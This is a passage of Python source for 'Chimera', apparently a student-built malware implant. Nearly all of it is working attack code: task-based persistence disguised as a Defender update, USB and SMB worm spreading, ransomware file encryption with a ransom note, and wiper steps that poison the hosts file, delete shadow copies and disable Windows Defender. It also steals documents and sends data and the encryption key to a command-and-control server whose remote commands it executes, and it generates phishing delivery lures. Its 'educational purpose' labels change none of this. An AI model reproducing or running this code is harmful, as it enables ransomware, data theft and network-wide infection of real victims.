            print(f"    [-] Registry persistence error: {e}")

        # INTEGRATED METHOD 2: Scheduled Task Persistence (Homey)
        # Uses ScheduledTaskPersistence class for advanced task-based persistence
        try:
            task_manager = ScheduledTaskPersistence(
                malware_path=self.current_path,
                task_name="MicrosoftDefenderUpdate"  # Disguised as legitimate Defender service
            )
            task_success = task_manager.establish_persistence()
            
            if task_success:
                print("    [+] ✓ Scheduled task persistence established (multi-trigger)")
            else:
                print("    [-] ✗ Scheduled task persistence failed")
        except Exception as e:
            print(f"    [-] Scheduled task persistence error: {e}")
        
        print("[+] Persistence complete (Homey integration successful)")

    # ==========================================
    # PROPAGATION MECHANISMS (INTEGRATED - Kimkheng)
    # ==========================================
    
    def propagate_usb_worm(self):
        """
        [INTEGRATED MODULE - Kimkheng: Lateral Movement Specialist]
        
        USB Worm Propagation - Spread to removable drives using advanced techniques
        
        INTEGRATED TECHNIQUES:
        1. USB Replication (USBReplicator class)
           - Automatic USB drive detection
           - Hidden folder creation with system attributes
           - Autorun.inf for automatic execution
           - Decoy folders to trick users
           - ADS (Alternate Data Streams) hiding
        
        MITRE ATT&CK Techniques:
        - T1091: Replication Through Removable Media
        - T1564.001: Hide Artifacts - Hidden Files and Directories
        
        Developer Integration: Kimkheng's USBReplicator class provides comprehensive
        USB propagation with multiple evasion techniques.
        """
        print("[+] Propagating via USB (Integrated - Kimkheng)...")
        print("    [*] Using USBReplicator module for advanced USB infection")
        
        try:
            # INTEGRATED METHOD: USB Replication (Kimkheng)
            # Uses USBReplicator class for advanced USB worm functionality
            usb_replicator = USBReplicator(malware_path=self.current_path)
            
            # Detect all available USB drives
            detected_drives = usb_replicator.detect_usb_drives()
            print(f"    [*] Detected {len(detected_drives)} removable drives")
            
            # Infect each detected USB drive
            for drive in detected_drives:
                try:
                    usb_replicator.infect_usb_drive(drive, safe_mode=False)
                    print(f"    [+] ✓ USB drive infected: {drive}")
                except Exception as e:
                    print(f"    [-] Failed to infect {drive}: {e}")
            
            infected_count = len(usb_replicator.infected_drives)
            print(f"[+] USB Propagation complete: {infected_count} drives infected (Kimkheng integration successful)")
            
        except Exception as e:
            print(f"[-] USB propagation error: {e}")
    
    def propagate_smb_lateral_movement(self):
        """
        [INTEGRATED MODULE - Kimkheng: Lateral Movement Specialist]
        
        SMB Lateral Movement - Spread across network using SMB protocol
        
        INTEGRATED TECHNIQUES:
        1. SMB Worm (RedTeamSMBWorm class)
           - Network host discovery (ARP table parsing)
           - SMB share enumeration
           - Remote file copying to network shares
           - WMI-based remote execution
           - Operational security delays
        
        MITRE ATT&CK Techniques:
        - T1021.002: Remote Services - SMB/Windows Admin Shares
        - T1135: Network Share Discovery
        - T1210: Exploitation of Remote Services
        
        Developer Integration: Kimkheng's RedTeamSMBWorm class enables network-wide
        propagation through SMB shares and remote execution.
        """
        print("[+] Initiating SMB Lateral Movement (Integrated - Kimkheng)...")
        print("    [*] Using RedTeamSMBWorm module for network propagation")
        
        try:
            # INTEGRATED METHOD: SMB Lateral Movement (Kimkheng)
            # Uses RedTeamSMBWorm class for network propagation
            smb_worm = RedTeamSMBWorm(malware_path=self.current_path)
            
            # Execute network-wide propagation
            smb_worm.spread_across_network(safe_mode=False)
            
            infected_count = len(smb_worm.infected_hosts)
            discovered_count = len(smb_worm.discovered_hosts)
            
            print(f"[+] SMB Lateral Movement complete:")
            print(f"    - Discovered: {discovered_count} hosts")
            print(f"    - Infected: {infected_count} hosts")
            print(f"    (Kimkheng integration successful)")
            
        except Exception as e:
            print(f"[-] SMB lateral movement error: {e}")

    # ==========================================
    # CORE MALICIOUS METHOD 1: FILE ENCRYPTION (RANSOMWARE)
    # ==========================================
    
    def encrypt_file(self, file_path):
        """
        Encrypt a single file using AES-256 encryption
        Args:
            file_path: Full path to the file to encrypt
        Returns:
            True if encryption succeeded, False otherwise
        """
        try:
            # Read the original file content in binary mode
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            # Encrypt the data using AES-256 (Fernet)
            encrypted_data = self.cipher_suite.encrypt(original_data)
            
            # Save the encrypted data with a new extension
            encrypted_path = file_path + ".chimera_encrypted"
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
                # CRITICAL: Flush to disk immediately to trigger file system events
                # This ensures aegis_real.py's watchdog can detect the modification
                f.flush()
                os.fsync(f.fileno())
            
            # Small delay to ensure file system event is registered
            time.sleep(0.01)
            
            # Delete the original unencrypted file
            os.remove(file_path)
            return True
        except Exception:
            # Silently fail if file cannot be encrypted (permissions, in use, etc.)
            return False

    def payload_ransomware(self):
        """Encrypt user files and demand ransom"""
        print("[+] Starting Ransomware Encryption...")
        
        # Reduced target scope for safer testing
        target_folders = [
            os.path.join(self.user_home, "Documents", "TestVictim"),  # Create this folder first for testing
            os.path.join(self.user_home, "Desktop")
        ]
        
        self.encrypted_count = 0
        
        for folder in target_folders:
            if os.path.exists(folder):
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                            file_path = os.path.join(root, file)
                            if self.encrypt_file(file_path):
                                self.encrypted_count += 1
                                if self.encrypted_count % 10 == 0:
                                    print(f"    [+] Encrypted {self.encrypted_count} files...")
                                # Small delay between encryptions (realistic ransomware behavior)
                                # This also ensures aegis detection system can process events
                                time.sleep(0.05)
        
        # Create ransom note
        self.create_ransom_note()
        
        # CRITICAL: Send encryption key to C2 server immediately
        # This ensures the key is backed up even if local report is lost
        if self.encrypted_count > 0:
            self.send_encryption_key_to_c2()
        
        print(f"[+] Ransomware: Encrypted {self.encrypted_count} files")
        return self.encrypted_count

    def create_ransom_note(self):
        """Create ransom note (FIXED KEY DISPLAY)"""
        # FIX: We now decode the key to string so you can copy it exactly
        key_string = self.encryption_key.decode()
        
        ransom_note = f"""
        ⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️
        
        What happened?
        ==============
        Your important files have been encrypted with military-grade AES-256 encryption.
        The following file types were affected: {', '.join(TARGET_EXTENSIONS)}
        
        Total files encrypted: {self.encrypted_count}
        
        How to recover your files?
        ==========================
        Use this KEY to decrypt your files (COPY EXACTLY):
        {key_string}
        
        Run command: python chimera_real.py --decrypt <KEY>
        
        ⚠️ WARNING:
        - Do NOT modify encrypted files
        - Do NOT use third-party recovery tools
        
        Contact: support@chimera.com (Educational Purpose Only)
        """
        
        # Create ransom note in multiple locations
        locations = [
            os.path.join(self.user_home, "Desktop", "READ_ME_FOR_DECRYPT.txt"),
            os.path.join(self.user_home, "Documents", "READ_ME_FOR_DECRYPT.txt")
        ]
        
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(ransom_note)
            except:
                pass

    # ==========================================
    # CORE MALICIOUS METHOD 2: SYSTEM CORRUPTION (WIPER)
    # ==========================================
    
    def payload_system_corruption(self):
        """
        CORE MALICIOUS METHOD #2: System Corruption (Wiper)
        Corrupt critical system files and disable security features
        This makes the system unstable and prevents recovery
        """
        print("[+] Starting System Corruption...")
        
        # Counter for successful corruption actions
        corruption_actions = 0
        
        # ACTION 1: Corrupt Windows hosts file to block security websites
        # The hosts file maps domain names to IP addresses
        try:
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            if os.path.exists(hosts_path):
                malicious_entries = [
                    "\n# CHIMERA MALWARE REDIRECTS - DO NOT REMOVE",
                    "127.0.0.1 microsoft.com",
                    "127.0.0.1 windowsupdate.microsoft.com",
                    "127.0.0.1 live.com",
                    "127.0.0.1 antivirus.com",
                    "127.0.0.1 avast.com",
                    "127.0.0.1 bitdefender.com",
                    "127.0.0.1 kaspersky.com",
                    "127.0.0.1 mcafee.com",
                    "127.0.0.1 symantec.com",
                    "127.0.0.1 norton.com",
                    "127.0.0.1 malwarebytes.com"
                ]
                
                # REAL IMPLEMENTATION: Actually write to hosts file
                with open(hosts_path, 'a') as f:
                    f.write('\n'.join(malicious_entries))
                    f.flush()  # Ensure it's written to disk
                    os.fsync(f.fileno())  # Force OS to write to disk
                
                corruption_actions += 1
                print("    [+] Corrupted hosts file - blocked security sites")
        except PermissionError:
            print("    [-] Hosts file corruption failed: Need administrator privileges")
        except Exception as e:
            print(f"    [-] Hosts file corruption failed: {e}")

        # ACTION 2: Delete volume shadow copies (prevents file recovery)
        # This requires administrator privileges to execute
        try:
            result = subprocess.call("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if result == 0:
                corruption_actions += 1
                print("    [+] Deleted volume shadow copies (recovery disabled)")
            else:
                # Try alternative method using wmic
                result2 = subprocess.call("wmic shadowcopy delete /nointeractive", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if result2 == 0:
                    corruption_actions += 1
                    print("    [+] Deleted volume shadow copies via WMIC")
        except Exception as e:
            print(f"    [-] Shadow copy deletion failed: {e}")

        # ACTION 3: Disable Windows Defender real-time protection
        # These PowerShell commands actually disable Windows Defender (requires admin)
        try:
            commands = [
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
                'powershell -Command "Set-MpPreference -DisableScriptScanning $true"'
            ]
            
            success_count = 0
            for cmd in commands:
                result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if result == 0:
                    success_count += 1
            
            if success_count > 0:
                corruption_actions += 1
                print(f"    [+] Disabled {success_count}/5 Windows Defender protections")
        except Exception as e:
            print(f"    [-] Defender disabling failed: {e}")

        # ACTION 4: Create corruption markers
        corruption_folders = [
            os.path.join(self.user_home, "AppData", "Local", "Temp"),
            os.path.join(self.user_home, "AppData", "Local", "Google", "Chrome"),
            os.path.join(self.user_home, "AppData", "Local", "Microsoft", "Windows")
        ]
        
        for folder in corruption_folders:
            if os.path.exists(folder):
                try:
                    marker_file = os.path.join(folder, "CORRUPTED_BY_CHIMERA.txt")
                    with open(marker_file, 'w') as f:
                        f.write(f"System compromised by Chimera malware\nTime: {time.ctime()}\n")
                    corruption_actions += 1
                except:
                    pass

        print(f"[+] System Corruption: Completed {corruption_actions} destructive actions")
        return corruption_actions

    # ==========================================
    # CORE MALICIOUS METHOD 3: DATA EXFILTRATION (SPYWARE)
    # ==========================================
    
    def payload_data_exfiltration(self):
        """
        CORE MALICIOUS METHOD #3: Data Exfiltration (Spyware)
        Steal sensitive information from the victim's computer
        Collects system info, document samples, network config, and browser data
        """
        print("[+] Starting Data Exfiltration...")
        
        # Collect all types of sensitive data into a structured dictionary
        stolen_data = {
            "system_info": self.collect_system_info(),           # Computer name, user, OS version
            "document_samples": self.steal_document_samples(),   # First 500 bytes from docs
            "network_info": self.collect_network_info(),         # IP address, network config
            "browser_data": self.find_browser_data(),            # Browser installation locations
            "timestamp": time.time()                             # When the theft occurred
        }
        
        # Save locally
        self.save_stolen_data(stolen_data)
        
        print(f"[+] Data Exfiltration: Stole {self.stolen_data_count} document samples")
        return self.stolen_data_count

    def collect_system_info(self):
        """Collect comprehensive system information"""
        info = {
            "computer_name": socket.gethostname(),
            "username": os.getlogin(),
            "user_home": self.user_home,
            "windows_version": str(sys.getwindowsversion()),
            "current_time": time.ctime(),
            "malware_path": self.current_path,
            "processor_count": os.cpu_count()
        }
        return info

    def steal_document_samples(self):
        """Steal samples from documents"""
        samples = {}
        self.stolen_data_count = 0
        
        document_folders = [
            os.path.join(self.user_home, "Documents"),
            os.path.join(self.user_home, "Desktop"),
            os.path.join(self.user_home, "Downloads")
        ]
        
        for folder in document_folders:
            if os.path.exists(folder):
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        if any(file.endswith(ext) for ext in ['.txt', '.docx', '.pdf']):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    sample_data = f.read(200)  # First 200 bytes
                                
                                samples[file] = {
                                    "path": file_path,
                                    "size": os.path.getsize(file_path),
                                    "sample_hex": sample_data.hex(),
                                    "sample_text": sample_data[:100].decode('utf-8', errors='ignore')
                                }
                                
                                self.stolen_data_count += 1
                                
                                if self.stolen_data_count >= 15:  # Limit for demo
                                    return samples
                                    
                            except:
                                continue
        return samples

    def collect_network_info(self):
        """Collect network configuration"""
        info = {}
        try:
            info["hostname"] = socket.gethostname()
            info["local_ip"] = socket.gethostbyname(socket.gethostname())
            
            # Get network adapters info
            try:
                output = subprocess.check_output("ipconfig", shell=True).decode('utf-8', errors='ignore')
                info["ipconfig"] = output
            except:
                info["ipconfig"] = "Unable to retrieve"
                
        except Exception as e:
            info["error"] = str(e)
        
        return info

    def find_browser_data(self):
        """Locate browser data locations"""
        browsers = {}
        
        browser_paths = {
            "chrome": os.path.join(self.user_home, "AppData", "Local", "Google", "Chrome"),
            "edge": os.path.join(self.user_home, "AppData", "Local", "Microsoft", "Edge"),
            "firefox": os.path.join(self.user_home, "AppData", "Roaming", "Mozilla", "Firefox")
        }
        
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                browsers[browser] = {
                    "path": path,
                    "exists": True,
                    "size": self.get_folder_size(path)
                }
            else:
                browsers[browser] = {"exists": False}
        
        return browsers

    def get_folder_size(self, folder):
        """Calculate folder size"""
        try:
            total_size = 0
            for dirpath, dirnames, filenames in os.walk(folder):
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    try:
                        total_size += os.path.getsize(filepath)
                    except:
                        pass
            return total_size
        except:
            return 0

    def save_stolen_data(self, stolen_data):
        """Save stolen data to local file"""
        try:
            exfil_file = os.path.join(os.getcwd(), "chimera_exfiltrated_data.json")
            with open(exfil_file, 'w', encoding='utf-8') as f:
                json.dump(stolen_data, f, indent=4, ensure_ascii=False)
            print("    [+] Saved stolen data locally")
        except Exception as e:
            print(f"    [-] Failed to save stolen data: {e}")

    def send_encryption_key_to_c2(self):
        """
        Send encryption key to C2 server for backup
        
        This is CRITICAL functionality:
        - Ensures decryption key is never lost
        - Stores key on attacker's C2 server
        - Multiple retry attempts with exponential backoff
        - Falls back to local storage if C2 unavailable
        
        Key is sent in JSON format:
        {
            "type": "encryption_key",
            "key": "<base64_key_string>",
            "bot_id": "<hostname_username>",
            "encrypted_files": <count>,
            "timestamp": <unix_timestamp>
        }
        """
        print("[+] Sending encryption key to C2 server...")
        
        # Prepare key message
        key_string = self.encryption_key.decode()  # Convert bytes to string
        key_message = {
            "type": "encryption_key",
            "key": key_string,
            "bot_id": f"{socket.gethostname()}_{os.getlogin()}",
            "computer_name": socket.gethostname(),
            "username": os.getlogin(),
            "encrypted_files": self.encrypted_count,
            "timestamp": time.time()
        }
        
        # Try multiple times with exponential backoff
        max_retries = 5
        retry_delays = [1, 2, 5, 10, 30]  # Seconds between retries
        
        for attempt in range(max_retries):
            try:
                # Create new socket for key exfiltration
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10.0)  # 10 second timeout
                
                # Connect to C2 server
                s.connect((C2_SERVER, C2_PORT))
                
                # Send key message
                s.send(json.dumps(key_message).encode())
                
                # Wait for acknowledgment
                try:
                    ack = s.recv(1024).decode()
                    if ack:
                        print(f"    [+] Encryption key sent to C2 server successfully")
                        print(f"    [+] Key backed up on: {C2_SERVER}:{C2_PORT}")
                        s.close()
                        return True
                except:
                    pass  # No ACK needed, just send
                
                s.close()
                print(f"    [+] Encryption key sent to C2 server (attempt {attempt + 1})")
                return True
                
            except (socket.error, socket.timeout, ConnectionRefusedError) as e:
                # Connection failed
                if attempt < max_retries - 1:
                    delay = retry_delays[attempt]
                    print(f"    [-] C2 connection failed (attempt {attempt + 1}/{max_retries}), retrying in {delay}s...")
                    time.sleep(delay)
                else:
                    print(f"    [-] Failed to send key to C2 after {max_retries} attempts")
                    print(f"    [!] Key ONLY saved locally - ensure you backup the report file!")
            except Exception as e:
                print(f"    [-] Unexpected error sending key: {e}")
                break
        
        # Fallback: Ensure key is saved locally
        try:
            fallback_file = os.path.join(os.getcwd(), "ENCRYPTION_KEY_BACKUP.txt")
            with open(fallback_file, 'w') as f:
                f.write(f"ENCRYPTION KEY BACKUP\n")
                f.write(f"{'='*50}\n")
                f.write(f"Bot: {socket.gethostname()}_{os.getlogin()}\n")
                f.write(f"Encrypted Files: {self.encrypted_count}\n")
                f.write(f"Timestamp: {time.ctime()}\n")
                f.write(f"{'='*50}\n")
                f.write(f"KEY: {key_string}\n")
            print(f"    [+] Fallback: Key saved to {fallback_file}")
        except:
            pass
        
        return False

    # ==========================================
    # C2 COMMUNICATION WITH COMMAND HANDLING
    # ==========================================
    
    def handle_c2_communication(self):
        """
        Command & Control (C2) Communication Handler
        Establishes connection to remote C2 server and waits for commands
        Sends bot information and receives remote execution commands
        Implements automatic retry on connection failure with exponential backoff
        """
        print("[+] Starting C2 Communication Handler...")
        
        retry_count = 0
        max_retry_delay = 300  # Maximum 5 minutes between retries
        
        # Main C2 loop - keeps trying to connect until shutdown
        while self.keep_alive:
            try:
                # Calculate retry delay with exponential backoff
                if retry_count > 0:
                    delay = min(30 * (2 ** (retry_count - 1)), max_retry_delay)
                    print(f"    [*] Retry attempt {retry_count}, waiting {delay}s before reconnecting...")
                    time.sleep(delay)
                
                # Create socket connection
                print(f"    [*] Attempting to connect to C2: {C2_SERVER}:{C2_PORT}")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30.0)
                s.connect((C2_SERVER, C2_PORT))
                
                # Reset retry counter on successful connection
                retry_count = 0
                
                # Send handshake
                handshake = {
                    "type": "handshake",
                    "bot_id": f"{socket.gethostname()}_{os.getlogin()}",
                    "computer_name": socket.gethostname(),
                    "username": os.getlogin(),
                    "malware_version": "Chimera_Complete_v2.0",
                    "timestamp": time.time(),
                    "status": "ACTIVE",
                    "encrypted_files": self.encrypted_count,
                    "encryption_key": self.encryption_key.decode()  # Include key in handshake
                }
                
                s.send(json.dumps(handshake).encode())
                print("    [+] Connected to C2 server, waiting for commands...")
                
                # Listen for commands
                while self.keep_alive:
                    try:
                        data = s.recv(4096).decode()
                        if not data:
                            print("    [!] C2 connection closed by server")
                            break
                            
                        command_data = json.loads(data)
                        command = command_data.get('command', '')
                        parameters = command_data.get('parameters', '')
                        
                        print(f"    [+] Received command: {command} {parameters}")
                        
                        # Execute command
                        result = self.execute_command(command, parameters)
                        
                        # Send result back with bot_id for better C2 tracking
                        response = {
                            "type": "command_result",
                            "command": command,
                            "result": result,
                            "timestamp": time.time(),
                            "bot_id": f"{socket.gethostname()}_{os.getlogin()}"
                        }
                        
                        try:
                            s.send(json.dumps(response).encode())
                            print(f"    [+] Executed: {command}")
                            print(f"    [+] Result sent to C2")
                        except (BrokenPipeError, ConnectionResetError):
                            print("    [!] Failed to send response, connection lost")
                            break
                        
                        # Send exfiltrated data if available
                        if command == "exfiltrate":
                            stolen_data = self.collect_exfiltration_data()
                            # Convert stolen_data dict to JSON string for transmission
                            exfil_message = {
                                "type": "exfiltration",
                                "data": json.dumps(stolen_data, indent=2, ensure_ascii=False),
                                "file_count": self.encrypted_count,
                                "stolen_samples": self.stolen_data_count,
                                "bot_id": f"{socket.gethostname()}_{os.getlogin()}"
                            }
                            try:
                                s.send(json.dumps(exfil_message).encode())
                                print(f"    [+] Exfiltrated {self.stolen_data_count} samples to C2")
                            except (BrokenPipeError, ConnectionResetError):
                                print("    [!] Failed to send exfiltration data")
                                break
                            
                    except socket.timeout:
                        continue
                    except json.JSONDecodeError as e:
                        print(f"    [-] Invalid JSON from C2: {e}")
                        continue
                    except Exception as e:
                        print(f"    [-] Command handling error: {e}")
                        break
                
                s.close()
                
            except (ConnectionRefusedError, socket.timeout) as e:
                retry_count += 1
                print(f"    [-] C2 connection failed: {e}")
            except Exception as e:
                retry_count += 1
                print(f"    [-] C2 error: {e}")
                
            # Limit retry attempts
            if retry_count > 10:
                print(f"    [!] Too many failed connection attempts, waiting 5 minutes...")
                time.sleep(300)
                retry_count = 0

    def execute_command(self, command, parameters):
        """
        Execute commands received from C2 server
        Supports multiple command types for remote control of the malware
        
        Args:
            command: The command to execute (encrypt_files, exfiltrate, etc.)
            parameters: Optional parameters for the command
        Returns:
            Dictionary with command result (will be sent back to C2 as JSON)
        """
        result = ""
        try:
            # COMMAND: Trigger ransomware encryption
            if command == "encrypt_files":
                count = self.payload_ransomware()
                result = f"✓ Ransomware executed successfully\nFiles encrypted: {count}\nEncryption key sent to C2 server"
            
            # COMMAND: Trigger system corruption (wiper)
            elif command == "corrupt_system":
                count = self.payload_system_corruption()
                result = f"✓ System corruption executed\nDestructive actions completed: {count}\nTargets: Hosts file, Shadow copies, Windows Defender"
            
            # COMMAND: Trigger data exfiltration (spyware)
            elif command == "exfiltrate":
                count = self.payload_data_exfiltration()
                result = f"✓ Data exfiltration completed\nDocument samples stolen: {count}\nData includes: System info, documents, network config, browser data"
            
            # COMMAND: Get basic system information
            elif command == "system_info":
                info = self.collect_system_info()
                result = f"""✓ System Information Collected:

Computer Name: {info.get('computer_name', 'N/A')}
Username: {info.get('username', 'N/A')}
User Home: {info.get('user_home', 'N/A')}
Windows Version: {info.get('windows_version', 'N/A')}
Processor Count: {info.get('processor_count', 'N/A')}
Malware Path: {info.get('malware_path', 'N/A')}
Current Time: {info.get('current_time', 'N/A')}"""
            
            # COMMAND: Check if bot is alive
            elif command == "status":
                result = f"""✓ Bot Status Report:

Bot ID: {socket.gethostname()}_{os.getlogin()}
Status: ACTIVE
Files Encrypted: {self.encrypted_count}
Documents Exfiltrated: {self.stolen_data_count}
C2 Connection: ACTIVE
Persistence: Established
Last Activity: {time.ctime()}"""
            
            # COMMAND: Trigger USB worm propagation
            elif command == "propagate":
                self.propagate_usb_worm()
                result = "✓ USB propagation executed\nScanned drives: D-Z\nMalware copied to available USB drives\nAutorun files created"
            
            # COMMAND: Shutdown the malware gracefully
            elif command == "shutdown":
                self.keep_alive = False
                result = "✓ Shutdown command received\nTerminating malware process\nClosing C2 connection"
            
            # COMMAND: Execute full attack sequence (all payloads at once)
            # This is triggered by the C2 'autoexecute' command
            elif command == "auto_execute":
                try:
                    # Run the full attack in a background thread to avoid blocking C2 communication
                    threading.Thread(target=self._auto_execute_all, daemon=True).start()
                    result = f"""✓ Auto-Execute Started

Initializing full attack sequence...
Persistence: Establishing (Registry + Scheduled Task)
Propagation: Deploying USB worm
Payloads: Launching ransomware, wiper, spyware

Attack running in background. Use 'status' to check progress."""
                except Exception as e:
                    result = f"✖ Failed to start auto-execution\nError: {e}"
            
            # COMMAND: Unknown - return error
            else:
                result = f"✖ Unknown command: {command}\nUse 'help' on C2 server to see available commands"
                
        except Exception as e:
            result = f"✖ Command execution failed\nError: {str(e)}"
        
        return result

    def collect_exfiltration_data(self):
        """Collect data for exfiltration"""
        return {
            "system_info": self.collect_system_info(),
            "document_samples": self.steal_document_samples(),
            "network_info": self.collect_network_info(),
            "file_count": self.encrypted_count,
            "timestamp": time.time()
        }
    
    # ==========================================
    # DELIVERY METHODS (INTEGRATED - Puleu)
    # ==========================================
    
    def generate_delivery_payloads(self):
        """
        [INTEGRATED MODULE - Puleu: Delivery Specialist]
        
        Generate all delivery payloads for initial compromise
        
        INTEGRATED TECHNIQUES:
        1. HTML Smuggling (HTMLSmuggler class)
           - DHL shipping notification template
           - Invoice payment template
           - Office 365 security alert template
           - Base64-encoded payload embedding
           - Automatic download via JavaScript
        
        2. LNK Generation (LNKGenerator class)
           - Classic LNK with PDF icon disguise
           - RTLO (Right-to-Left Override) for filename spoofing
           - Word/Excel document disguises
           - PowerShell download cradles
        
        MITRE ATT&CK Techniques:
        - T1027.006: HTML Smuggling
        - T1204.001: User Execution - Malicious Link
        - T1547.009: Shortcut Modification
        - T1036.007: Double File Extension
        
        Developer Integration: Puleu's HTMLSmuggler and LNKGenerator classes provide
        multiple initial access vectors for social engineering attacks.
        
        Usage:
            This method should be called BEFORE distributing the malware to create
            all delivery artifacts (HTML files and LNK shortcuts).
        """
        print("[+] Generating Delivery Payloads (Integrated - Puleu)...")
        print("    [*] Using HTMLSmuggler and LNKGenerator modules")
        
        # INTEGRATED METHOD 1: HTML Smuggling (Puleu)
        try:
            html_smuggler = HTMLSmuggler()
            
            # Generate all HTML smuggling templates
            templates = ['dhl', 'invoice', 'office365']
            for template in templates:
                html_file = html_smuggler.generate_html_smuggling(
                    payload_path=self.current_path,
                    template=template
                )
                if html_file:
                    print(f"    [+] ✓ HTML smuggling file created: {template} template")
            
            print("    [+] HTML smuggling generation complete")
            
        except Exception as e:
            print(f"    [-] HTML smuggling generation error: {e}")
        
        # INTEGRATED METHOD 2: LNK Generation (Puleu)
        try:
            lnk_generator = LNKGenerator()
            
            # Generate all LNK variants
            lnk_files = lnk_generator.generate_all_variants(c2_ip=C2_SERVER)
            
            print(f"    [+] ✓ LNK generation complete: {len(lnk_files)} variants created")
            print(f"    [+] LNK files include: Classic, RTLO, Word, Excel disguises")
            
        except Exception as e:
            print(f"    [-] LNK generation error: {e}")
        
        print("[+] Delivery payload generation complete (Puleu integration successful)")
        print(f"    [*] Artifacts saved in:")
        print(f"        - html_smuggling_output/ (HTML files)")
        print(f"        - lnk_payloads/ (LNK shortcuts)")

    def _auto_execute_all(self):
        """
        Internal helper to run the full attack sequence without starting a second C2 handler.
        This runs persistence, propagation, and the three core payloads (encryption, corruption, exfiltration)
        concurrently in background threads.
        """
        try:
            print("[+] Auto-execution: Establishing persistence...")
            try:
                self.establish_persistence()
            except Exception as e:
                print(f"    [-] Persistence error during auto_execute: {e}")

            print("[+] Auto-execution: Propagating via USB...")
            try:
                self.propagate_usb_worm()
            except Exception as e:
                print(f"    [-] Propagation error during auto_execute: {e}")

            print("[+] Auto-execution: Launching core payloads...")
            threads = []
            threads.append(threading.Thread(target=self.payload_ransomware, daemon=True))
            threads.append(threading.Thread(target=self.payload_system_corruption, daemon=True))
            threads.append(threading.Thread(target=self.payload_data_exfiltration, daemon=True))

            for t in threads:
                t.start()
                time.sleep(0.2)

            # Optionally wait a short time for initial activity
            for t in threads:
                t.join(timeout=60)

            # Create attack report after initial payloads
            try:
                self.create_attack_report()
                print("[+] Auto-execution: Initial payloads complete and report created")
            except Exception as e:
                print(f"    [-] Failed to create attack report: {e}")

            return True
        except Exception as e:
            print(f"[!] Auto-execution encountered an error: {e}")
            return False

    # ==========================================
    # MAIN EXECUTION FLOW
    # ==========================================
    
    def execute_malware(self):
        """Main malware execution sequence"""
        print("""
        ╔═══════════════════════════════════════════════╗
        ║              CHIMERA MALWARE                  ║
        ║         Complete Attack Sequence              ║
        ║         Educational Purpose Only              ║
        ╚═══════════════════════════════════════════════╝
        """)
        
        # Phase 1: Persistence (Homey's integrated modules)
        self.establish_persistence()
        time.sleep(1)
        
        # Phase 2: Propagation (Kimkheng's integrated modules)
        print("\n[+] Phase 2: Propagation (USB + SMB)")
        self.propagate_usb_worm()  # USB worm using USBReplicator
        time.sleep(1)
        self.propagate_smb_lateral_movement()  # SMB propagation using RedTeamSMBWorm
        time.sleep(1)
        
        # Phase 3: Core Malicious Payloads in parallel
        print("\n[+] Executing Core Malicious Payloads...")
        
        threads = []
        
        encryption_thread = threading.Thread(target=self.payload_ransomware)
        corruption_thread = threading.Thread(target=self.payload_system_corruption)
        exfiltration_thread = threading.Thread(target=self.payload_data_exfiltration)
        c2_thread = threading.Thread(target=self.handle_c2_communication)
        
        threads.extend([encryption_thread, corruption_thread, exfiltration_thread, c2_thread])
        
        # Start all threads
        for thread in threads:
            thread.daemon = True
            thread.start()
            time.sleep(0.5)
        
        # Wait for initial payload completion
        for i, thread in enumerate(threads[:3]):  # First 3 are payload threads
            thread.join(timeout=60)
        
        # Create final report
        self.create_attack_report()
        
        print("""
        ╔═══════════════════════════════════════════════╗
        ║             INITIAL ATTACK COMPLETE           ║
        ║         C2 Communication Active               ║
        ║         Waiting for remote commands...        ║
        ╚═══════════════════════════════════════════════╝
        """)
        
        # Keep C2 thread alive
        try:
            while self.keep_alive:
                time.sleep(1)
        except KeyboardInterrupt:
            self.keep_alive = False
            print("\n[!] Malware shutdown initiated...")

    def create_attack_report(self):
        """Create detailed attack report (FIXED KEY STORAGE)"""
        # FIX: Decode the key to a standard string
        key_str = self.encryption_key.decode()
        
        report = f"""
        CHIMERA MALWARE - ATTACK REPORT
        ================================
        Timestamp: {time.ctime()}
        Target: {socket.gethostname()} - {os.getlogin()}
        
        ATTACK METRICS:
        - Files Encrypted: {self.encrypted_count}
        - Documents Stolen: {self.stolen_data_count}
        - Persistence Established: Yes
        - USB Propagation: Active
        - C2 Communication: ACTIVE
        
        DECRYPTION KEY (SAVE THIS SAFE - COPY EXACTLY):
        {key_str}
        
        STATUS: Waiting for C2 commands...
        
        REMINDER: This is for educational purposes only!
        """
        
        report_file = os.path.join(os.getcwd(), "chimera_attack_report.txt")
        with open(report_file, 'w') as f:
            f.write(report)
        print(f"[+] Attack report saved: {report_file}")

# ==========================================
# DECRYPTION TOOL (FIXED)
# ==========================================

class ChimeraDecryptor:
    """
    Decryption Tool for Chimera Ransomware
    
    This class provides functionality to decrypt files that were encrypted
    by the Chimera malware. It requires the original encryption key that
    was generated during the attack.
    
    Usage:
        python chimera_real.py --decrypt <encryption_key>
    
    The key can be found in:
        - chimera_attack_report.txt
        - READ_ME_FOR_DECRYPT.txt
    """
    
    def __init__(self, encryption_key):
        """
        Initialize the decryptor with the encryption key
        
        Args:
            encryption_key: The Fernet key (bytes) used for encryption
        """
        # Create a Fernet cipher suite using the provided key
        # This same key was used to encrypt the files
        self.cipher_suite = Fernet(encryption_key)
    
    def decrypt_file(self, encrypted_path):
        """
        Decrypt a single file and restore original filename
        
        Args:
            encrypted_path: Path to the .chimera_encrypted file
        Returns:
